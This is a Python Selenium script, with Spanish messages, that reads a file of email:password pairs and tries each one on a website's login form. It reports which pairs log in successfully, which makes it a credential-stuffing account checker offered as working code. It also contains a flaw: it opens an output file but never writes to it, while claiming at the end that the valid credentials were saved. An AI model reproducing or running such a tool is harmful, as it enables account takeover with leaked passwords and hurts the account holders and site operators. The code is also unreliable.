from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
import os
import time

login_url = "https://www.gooogle.com"
dashboard_url = "https://www.google.com/dashboard"  


credentials_path = r'C:\Users\emi\Downloads\Prueba.txt'
valid_credentials_path = r'C:\Users\emi\Downloads\valid_credentials.txt'
if not os.path.isfile(credentials_path):
    print(f"El archivo {credentials_path} no existe.")
    exit(1)
chrome_options = Options()
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
with open(valid_credentials_path, 'w', encoding='utf-8') as valid_credentials_file:

    with open(credentials_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    total_lines = len(lines)
    print(f"Total de líneas a verificar: {total_lines}")
    for index, line in enumerate(lines):
        line = line.strip()
        if ':' not in line:
            print(f"Ignorando línea sin el formato adecuado: {line}")
            continue
        
        email, password = line.split(':')

        try:
            driver.get(login_url)
            time.sleep(2)  
            email_input = WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.NAME, 'email'))
            )
            password_input = WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.NAME, 'Clave'))
            )
            
            email_input.send_keys(email)
            password_input.send_keys(password)
            
           
            login_button = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, '//span[@class="btn-span-enter"]'))
            )
            login_button.click()
            
            
            try:
                error_message = WebDriverWait(driver, 10).until(
                    EC.visibility_of_element_located((By.XPATH, '//p[@class="error-password"]'))
                )
                print(f"Credenciales inválidas: {email}:{password} - Mensaje de error: {error_message.text}")
            except TimeoutException:
               
                print(f"Credenciales válidas encontradas: {email}:{password}")
                
               
                driver.get(dashboard_url)
                time.sleep(2)  
            
        except TimeoutException:
            print(f"Tiempo de espera agotado para {email}:{password}")
        except Exception as e:
            print(f"Error procesando {email}:{password} - Mensaje: {str(e)}")

        
        print(f"Progreso: {index + 1}/{total_lines} líneas verificadas")

driver.quit()
print(f"Credenciales válidas guardadas en {valid_credentials_path}")